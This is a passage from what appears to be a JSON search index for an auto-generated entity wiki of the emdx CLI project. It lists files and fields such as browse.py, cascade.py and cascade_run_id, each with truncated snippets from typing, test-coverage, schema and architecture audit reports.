1. Added Help Text to 5 Typer Apps (Missing Documentation)</p> File Help Text Added <code>browse.py</code> \"Browse and analyze the knowledge base\" <code>core.py</code> \"Core document operations: save, find, view, edit, delete\" <code>executions.py</code> \"Monitor and manage deleg... </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...File? | |--------|----------------| | <code>analyze.py</code> | \u274c NO | | <code>ask.py</code> | \u274c NO | | <code>browse.py</code> | \u2705 YES (<code>test_browse.py</code>) | | <code>cascade.py</code> | \u26a0\ufe0f PARTIAL (<code>test_cascade_metadata.py</code> tests DB, not CLI) | | <code>core.py</code> | \u2705 YES (<code>test_commands_core.py</code>) | | `delegat...</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...result: emdx/commands/gist.py:from emdx.utils.output import console emdx/commands/browse.py:from emdx.utils.... [00:02:55] \ud83d\udcbb Using tool: Bash [00:02:56] \ud83d\udcbb Using tool: Bash [00:02:56] \ud83d\udcbb Using tool: Bash [00:02:56] \ud83d\udcc4 Tool result: emdx/utils/output.py:from ric...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...All necessary</p> </li> <li>prime.py: All necessary</li> <li>categories.py: All necessary</li> <li>browse.py: All necessary</li> <li>briefing.py: 1 bug to fix</li> <li>compact.py: All necessary</li> <li> <p>executions.py: 1 special case (tri-state bool)</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...DERUTILIZED - Document grouping system. Adds complexity, unclear use case. | | browse.py | 253 | REDUNDANT - TUI browser. Could be simplified or merged with GUI. | | gist.py | 279 | NICHE - GitHub gist export. Used infrequently. | | epics...</p> </li> <li> <p>#6346 Delegate: PR #565 - Command Helpers Adoption [6/12]   Section: Changes Made</p> <p>...**: Removed ~50 lines by using <code>@combined_decorator</code> and <code>require_document()</code></p> </li> <li> <p>browse.py: Removed ~30 lines by using <code>@combined_decorator</code></p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Changes Made</p> <p>...tion processes\"</p> </li> <li>gist.py: \"Create and manage GitHub gists from documents\"</li> <li>browse.py: \"Browse documents and view statistics\"</li> </ul>"},{"location":"entities/browsepy/#browsepy_1","title":"browse.py","text":""},{"location":"entities/browsepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.9)</li> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>typer apps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>help text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>briefing.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>added help text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>gdoc.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>trash.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=5.8)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/browsercontainerpy/","title":"browser_container.py","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2026-01-05</p>"},{"location":"entities/browsercontainerpy/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6436 Any/None typing audit [5/5]</p> <p>| Suggested Replacement | |----------|----------|-----------|--------------|----------------------| | <code>PaletteResultItem.data</code> | L36 | <code>dict[str, Any]</code> | \u274c No | Polymorphic payload | | <code>_search_service</code> | L69 | <code>Any</code> | \u2705 Yes | `UnifiedSearchService ...</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Cleanup (Lower Impact)</p> # Item Files Effort 9 <code>browser_container.py</code> event types, registry, dump_widget 1 file 30m 10 <code>themes.py</code>, <code>text_areas.py</code>, <code>group_picker.py</code> quick wins 3 files 30m 11 P2 mock specs (Single... </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: Acceptable <code>Any</code> (Skip \u2014 Textual Framework Convention)</p> <p>...| | <code>log_browser.py</code> | 137 | <code>LogBrowser.__init__(*args: Any, **kwargs: Any)</code> | | <code>browser_container.py</code> | 84 | <code>BrowserContainer.__init__(*args: Any, **kwargs: Any)</code> | | <code>browser_container.py</code> | 91 | <code>BrowserContainer.exit(*args: Any, **kwargs: Any)</code> | | `search/searc...</p> </li> <li> <p>#6512 None Type Analysis [synthesis]   Section: Key Findings</p> <p>Files affected:</p> </li> <li><code>cascade_view.py</code> \u2014 <code>summary</code>, <code>doc_list</code>, <code>pipeline_table</code> (lines 91-93)</li> <li><code>cascade_browser.py</code> \u2014 <code>cascade_view</code> (line 48)</li> <li> <p><code>browser_container.py</code> \u2014 <code>container_widget</code> (line 86)</p> </li> <li> <p>#6510 None Type Analysis [7/7]   Section: High Confidence \u2014 Widget State Attributes (Set in <code>compose()</code>)</p> <ol> <li><code>browser_container.py</code>:</li> </ol> </li> <li> <p><code>self.container_widget: BrowserContainerWidget | None</code> \u2192 <code>BrowserContainerWidget</code></p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 5. Browser Container \u2014 <code>browser_states: dict[str, Any]</code></p> <p>Location: <code>emdx/ui/browser_container.py:85</code></p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.1 Static Widget <code>renderable</code> \u2192 <code>content</code> (v6.0.0)</p> <p>...rs</p> </li> <li><code>emdx/ui/search/search_screen.py</code> - Uses <code>Static</code> for mode buttons</li> <li><code>emdx/ui/browser_container.py</code> - Uses <code>Static</code> for fallback error messages</li> <li> <p><code>emdx/ui/cascade/cascade_view.py</code> - Uses <code>Static</code> for status/navigation</p> </li> <li> <p>#6173 Delegate: Audit docs/ directory for accuracy. For EACH file in docs/ ( [7/17]   Section: docs/ Directory Accuracy Audit</p> <p>...Log Mode</p> </li> <li><code>a</code> - Activity Mode</li> <li><code>4</code> - Cascade Mode</li> </ul> <p>Actual modes in <code>browser_container.py</code>: document, activity, log, cascade, search</p> <ul> <li>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: Suggested Implementation Phases </li> <li><code>/emdx/ui/gameplan_browser.py</code> - New browser mode</li> <li>Register in <code>browser_container.py</code></li> <li> <p>~550 lines following existing patterns</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...tte_presenter.py**: All 3 necessary</p> </li> <li>palette_commands.py: All 4 necessary</li> <li>browser_container.py: All 2 necessary</li> <li>activity_view.py: All 5 necessary</li> <li>activity_tree.py: All 3 necessary</li> <li>task_view.py: All 2 necessary</li> <li>keybindings/config.py: A...</li> </ul>"},{"location":"entities/browsercontainerpy/#phase-4-tui-browser","title":"Phase 4: TUI Browser","text":""},{"location":"entities/browsercontainerpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>search_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.3)</li> <li><code>inputs.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.3)</li> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/cascadepy/","title":"cascade.py","text":"<p>Type: heading | Mentioned in: 16 documents | First seen: 2026-02-13</p>"},{"location":"entities/cascadepy/#documents-16","title":"Documents (16)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>title: str | None = typer.Option(None, ...)</code> - Legitimate: CLI accepts no title</li> <li> <p><code>to_stage: str | None = typer.Option(None, ...)</code> - Legitimate: CLI accep...</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...| Need TypedDicts | |------|------------------|-------------|-----------------| | cascade.py | 1 | 1 | Yes (doc param) | | status.py | 1 | 1 | Partial | | analyze.py | 7 | 7 | Yes (new TypedDicts) | | prime.py | 6 | 6 | Yes (partial) | | recipe.py | 1 | 1 |...</p> </li> <li> <p>#6432 Any/None typing audit [1/5]</p> <p>| Suggested Replacement | |----------|-----------|--------------|----------------------| | <code>_parse_doc_datetimes</code> | <code>doc: dict[str, Any]</code> param, returns <code>dict[str, Any]</code> | No | Necessary - generic helper mutates dicts before they are cast to Type...</p> </li> <li> <p>#6437 Any/None typing audit [synthesis]   Section: Actionable Items</p> <p>...) | <code>params: list[Any]</code> | Use <code>list[str \\| int]</code> | | <code>documents.py</code>, <code>search.py</code>, <code>cascade.py</code> | <code>params: list[Any]</code> | Use <code>list[str \\| int]</code> or <code>SqlParams</code> alias |</p> </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]   Section: Summary</p> <p>...-----------------------------|----------| | documents.py | 12 functions | High | | cascade.py | 7 functions | High | | groups.py | 8 functions | Medium | | search.py | 1 function | Medium | | init.py (SQLiteDatabase) | 8 methods | Low (delegates) |</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 1. Transaction Isolation Failures (Multiple Locations)</p> <p>...mmits after INSERT, then calls <code>add_tags_to_document()</code> in separate transaction</p> </li> <li> <p><code>cascade.py:257-308</code> \u2014 Opens two separate connections for related operations</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...ions       \u2502 \u2502 \u251c\u2500\u2500 delegate.py   (779 lines) AI execution orchestration    \u2502 \u2502 \u2514\u2500\u2500 cascade.py    (754 lines) idea-to-code pipeline         \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 services/         Business logic layer...</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 1. SQL Query Duplication</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 3. Inconsistent Patterns</p> </li> <li>Most files: <code>from emdx.utils.output import console</code></li> <li><code>cascade.py</code>: <code>console = Console()</code> (creates new instance)</li> <li> <p><code>status.py</code>: <code>console = Console()</code> (creates new instance)</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>Lazy (heavy, loaded on demand):</p> </li> <li><code>delegate.py</code>: one-shot AI execution (parallel, chain, worktree, PR)</li> <li><code>cascade.py</code>: idea-to-code pipeline with stages</li> <li><code>recipe.py</code>: reusable recipe management</li> <li> <p><code>ask.py</code>: AI Q&amp;A over knowledge base</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Changes Made</p> <p>...ge Format (Issue #11 - Partial)</p> </li> <li>Added \"Error:\" prefix to validation messages in <code>cascade.py</code>:</li> <li>Invalid stage errors</li> <li>Invalid stop stage errors  </li> <li>Stage order errors</li> <li>Document not found errors</li> <li> <p>Added \"Error:\" prefix to validation messages in `re...</p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: 4. Inconsistent Error Output Formats</p> <p>...with rich | | <code>delegate.py</code> | <code>sys.stderr.write(f\"delegate: ...\")</code> plain text | | <code>cascade.py</code> | <code>console.print(f\"[red]Error: ...\")</code> rich | | <code>prime.py</code> | Mix of print() and console.print() |</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...yze.py<code>| \u274c NO | |</code>ask.py<code>| \u274c NO | |</code>browse.py<code>| \u2705 YES (</code>test_browse.py<code>) | |</code>cascade.py<code>| \u26a0\ufe0f PARTIAL (</code>test_cascade_metadata.py<code>tests DB, not CLI) | |</code>core.py<code>| \u2705 YES (</code>test_commands_core.py<code>) | |</code>delegate.py<code>| \u274c NO | |</code>executions.py` | \u26a0\ufe0f PARTIA...</p> </li> <li> <p>#6157 Delegate: Check if the legacy cascade wrapper functions in emdx/databa [2/5]   Section: Production Code (NO imports from documents.py)</p> <p>All production code imports from either:</p> </li> <li><code>emdx.database.cascade</code> (direct)</li> <li> <p><code>emdx.services.cascade_service</code> (facade that re-exports from cascade.py)</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...delegate.py: 5 bugs to fix (type mismatches)</p> </li> <li>core.py: All necessary</li> <li>cascade.py: All necessary (7 typer options + function params)</li> <li>tasks.py: All necessary</li> <li>groups.py: All necessary</li> <li>maintain.py: All necessary (return types)</li> <li> <p>*...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...ks but Unstable) | Command | LOC | Assessment | |---------|-----|------------| | cascade.py | 761 | EXPERIMENTAL - Idea\u2192code pipeline. Interesting concept, marked experimental in docs. Has dedicated DB tables. | | recipe.py | 160 | *THIN WRAPPER...</p> </li> </ul>"},{"location":"entities/cascadepy/#cascadepy_1","title":"cascade.py","text":""},{"location":"entities/cascadepy/#moderate-repeated-where-clauses","title":"Moderate: Repeated WHERE Clauses","text":"<p>Files: <code>documents.py</code>, <code>groups.py</code>, <code>cascade.py</code></p>"},{"location":"entities/cascadepy/#31-console-import-low","title":"3.1 Console Import (LOW)","text":""},{"location":"entities/cascadepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>briefing.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.5)</li> <li><code>recipe.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.4)</li> <li><code>connection.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>emdx/database/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>any type annotation audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/cascaderunid/","title":"cascade_run_id","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/cascaderunid/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...king directory / worktree path | | <code>pid</code> | INTEGER (nullable) | OS process ID | | <code>cascade_run_id</code> | INTEGER (nullable) | FK to cascade_runs | | <code>task_id</code> | INTEGER (nullable) | FK to tasks table | | <code>cost_usd</code> | REAL DEFAULT 0.0 | Total cost in USD | | `tokens_u...</p> </li> <li> <p>#6530 Delegate: Review GitHub PR #651 using 'gh pr view 651' and 'gh pr diff [2/4]   Section: \ud83d\udd0d Edge Cases</p> <ol> <li>Execution records: The <code>executions</code> table had <code>cascade_run_id</code> column. Existing execution records with cascade_run_id values will have dangling references, but this shouldn't cause runtime issues (just unused foreign keys).</li> </ol> </li> <li> <p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: Missing Fields Identified</p> </li> <li> <p><code>cascade_run_id</code> - Links executions to cascade runs</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p>...includes fields like <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cascade_run_id</code>, and <code>task_id</code>, but <code>get_execution()</code>, <code>get_recent_executions()</code>, <code>get_running_executions()</code>, and <code>get_stale_executions()</code> do not SELECT or populate these fields.</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> <ol> <li>Migration 031 columns:</li> </ol> </li> <li> <p><code>cascade_run_id</code> - Links execution to cascade runs</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 1. Fixed Execution Dataclass (MEDIUM severity)</p> <p>...columns to the <code>Execution</code> dataclass that were added by migrations 031 and 036:</p> </li> <li><code>cascade_run_id</code>: Links execution to cascade pipeline run</li> <li><code>task_id</code>: Links execution back to creating task</li> <li><code>cost_usd</code>: Actual cost from Claude API</li> <li> <p><code>tokens_used</code>: Total tokens...</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> <p>...Sync (Finding #1 - MEDIUM)</p> </li> <li>Added missing columns to <code>Execution</code> dataclass:</li> <li><code>cascade_run_id</code> (migration 031)</li> <li><code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code> (migration 036)</li> <li><code>last_heartbeat</code> (migration 037)</li> <li> <p>Refactored all SELE...</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...** (Migration)</p> </li> <li><code>Execution</code> dataclass missing 6 columns from migrations 031/036: <code>cascade_run_id</code>, <code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code></li> <li> <p><code>last_heartbeat</code> column queries exist but column was dropped in migration 013</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 1. MEDIUM: Execution Dataclass Out of Sync with Schema**</p> Column Migration Purpose <code>cascade_run_id</code> 031 Links execution to cascade pipeline run <code>task_id</code> 036 Links execution back to creating task <code>cost_usd</code> 036 Actual cost from Claude API `... </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Data Written to DB by Delegate</p> <p>...leted'/'failed'</p> </li> <li><code>log_file</code>: path to log</li> <li><code>working_dir</code>: cwd or worktree path</li> <li><code>cascade_run_id</code>: NULL (delegate doesn't use cascade)</li> </ul>"},{"location":"entities/cascaderunid/#from-migration-031","title":"From Migration 031","text":""},{"location":"entities/cascaderunid/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution.is_zombie</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>task_id: optional[int] = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>migration/schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>fixed heartbeat functionality</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>cascade_run_id: optional[int] = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>get_running_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>update_execution_heartbeat()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>get_stale_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>tokens_used: int = 0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/cascadeservicepy/","title":"cascade_service.py","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2026-02-14</p>"},{"location":"entities/cascadeservicepy/#documents-13","title":"Documents (13)","text":"<ul> <li>#6434 Any/None typing audit [4/5]   Section: Priority Recommendations <p>...th known shapes</p> </li> <li><code>duplicate_detector.py</code> - 3 functions with <code>dict[str, Any]</code></li> <li> <p><code>cascade_service.py</code> - <code>get_orphaned_cascade_executions()</code> returns well-defined dict</p> </li> <li> <p>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: 2. emdx/services/ (14 files audited)</p> <p>...ing health metrics</p> </li> <li><code>duplicate_detector.py</code>: 3 functions with duplicate info</li> <li> <p><code>cascade_service.py</code>: Orphaned execution data</p> </li> <li> <p>#6407 PR Evaluation: #567, #569, #572, #573, #575 vs mypy PR #588   Section: Detailed Analysis</p> </li> <li>Files: 2 (<code>activity_data.py</code>, <code>cascade_service.py</code>)</li> <li>Overlap: 1 file (<code>activity_data.py</code>)</li> <li>Issue: Only 1 file overlap, small PR, and the SQL migration is a genuine architectural improvement.</li> <li> <p>**Recommenda...</p> </li> <li> <p>#6375 Codebase Bug Audit 2026-02-15 [3/10]   Section: Critical Bugs (Severity: HIGH)</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Circular Dependencies Found \ud83d\udd34</p> <p>``` cascade_service.py \u2192 execution_service.py \u2192 executions model      \u2193                      \u2193 monitor_execution_completion() \u2192 get_execution() \u2192 update_execution_status()</p> </li> </ul> <pre><code>\n- **#6324** Delegate: Architecture Improvement Analysis v0.14.0 [9/10]\n  *Section: 2.1 Service Layer Consolidation (High Priority)*\n  &gt; **Current State**: Services are scattered with inconsistent patterns:\n- `services/cascade_service.py` - Facade re-exporting DB functions\n- `services/unified_executor.py` - 493 lines with formatting logic mixed in\n- `services/document_service.py` exists but `models/d...\n\n- **#6314** Delegate: analysis,architecture,active [13/15]\n  *Section: Core Architecture Layers*\n  &gt; ...s/`)\n- **`unified_executor.py`**: CLI execution abstraction for Claude/Cursor\n- **`cascade_service.py`**: pipeline facade for UI, monitoring completion\n- **`log_stream.py`**: event-driven log streaming via file watcher\n- **`auto_tagger.py`**: automatic tag assignment...\n\n- **#6310** Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]\n  *Section: Key Design Patterns*\n  &gt; ...ction.py:69`\n2. **Facade Pattern** \u2014 Services re-export database functions (e.g., `cascade_service.py`, `tag_service.py`)\n3. **DTO Pattern** \u2014 Dataclasses for typed results (`Execution`, `SemanticMatch`, etc.)\n4. **Context Manager** \u2014 Database connections via `get_co...\n\n- **#6308** Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]\n  *Section: 6. Service Interface Analysis*\n  &gt; **Services with cleanup potential:**\n- `cascade_service.py` - unused, logic moved to commands\n- `health_monitor.py` - overlaps with `execution_monitor.py`\n- `duplicate_detector.py` - replaced by `similarity.py`\n\n- **#6306** Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]\n  *Section: 5. **MEDIUM: Services That Bypass Service Layer***\n  &gt; **File:** `services/cascade_service.py` (lines 30-59)\n\n- **#6304** Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]\n  *Section: Alias vs Direct Import*\n  &gt; # Pattern B: Use 'db_connection' (explicit)\nfrom .connection import db_connection\ndb_connection.get_connection()  # database/search.py:9, services/cascade_service.py:15\n</code></pre> <ul> <li>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary <p>...lth_monitor.py**: All 2 necessary</p> </li> <li>duplicate_detector.py: All 2 necessary</li> <li>cascade_service.py: All 2 necessary</li> <li>file_watcher.py: All 1 necessary</li> <li> <p>execution_service.py: All 1 necessary</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: Files with NO unnecessary <code>| None</code> annotations</p> <p>...onal params</p> </li> <li>duplicate_detector.py \u2014 All <code>| None</code> for optional limits</li> <li>cascade_service.py \u2014 All <code>| None</code> for nullable database fields</li> <li>file_watcher.py \u2014 All <code>| None</code> for optional thread/observer</li> <li>execution_service.py \u2014 All <code>| None</code> for nul...</li> </ul>"},{"location":"entities/cascadeservicepy/#pr-569-move-sql-to-service-layer","title":"PR #569 - Move SQL to Service Layer","text":""},{"location":"entities/cascadeservicepy/#3-infinite-loop-risk-no-exit-condition-on-process-zombie","title":"3. Infinite Loop Risk: No 